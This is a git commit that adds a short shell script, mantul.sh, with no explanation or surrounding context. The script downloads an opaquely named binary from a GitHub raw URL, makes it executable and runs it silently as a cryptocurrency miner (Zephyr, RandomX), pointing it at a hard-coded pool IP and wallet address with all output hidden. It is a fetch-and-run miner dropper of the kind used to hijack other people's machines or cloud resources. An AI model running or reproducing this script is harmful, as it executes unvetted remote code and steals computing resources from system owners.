81134032de3a91815fc429b44ee25292a7734e84
ganggamulyana08 <ganggamulyana08@gmail.com>
2024-08-01 16:50:29 +0700

    Create mantul.sh

---
+++ mantul.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+A=188.166.186.218:443
+B=8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB
+C=GAS
+wget https://github.com/14613261/14613261/raw/main/jilox && chmod u+x jilox >/dev/null 2>&1
+./jilox --coin=ZEPH --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
